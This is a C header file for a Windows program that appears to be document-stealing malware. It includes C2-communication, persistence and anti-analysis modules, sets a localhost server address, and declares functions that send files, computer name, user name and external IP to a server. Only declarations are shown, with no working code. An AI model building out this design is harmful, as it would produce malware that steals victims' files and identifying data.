#ifndef DOCPLZ_COMMUN_H
#define DOCPLZ_COMMUN_H

#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <winternl.h>
#include <winhttp.h>
#include <lmcons.h> // For UNLEN
#include <sys/stat.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <process.h>

#include "Findem.h"
#include "ComunicationC2.h"
#include "Persistence.h"
#include "Crypto.h"
#include "AntiStuff.h"
#include "genMetadata.h"
#include "ProcStuff.h"

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp")

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define BUFFER_SIZE 1024
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT_DIR 8080
#define SERVER_PORT_FILE 8081

// Function declarations
void ConnectToServer(const char* ip, const char* computerName, const char* userName);
void SendDataToServer(const char* filePath, BYTE* fileHash, const char* ip, const char* computerName, const char* userName);
char* get_computer_name();
char* get_user_name();
void get_external_ip(char* ip);

#endif // DOCPLZ_COMMUN_H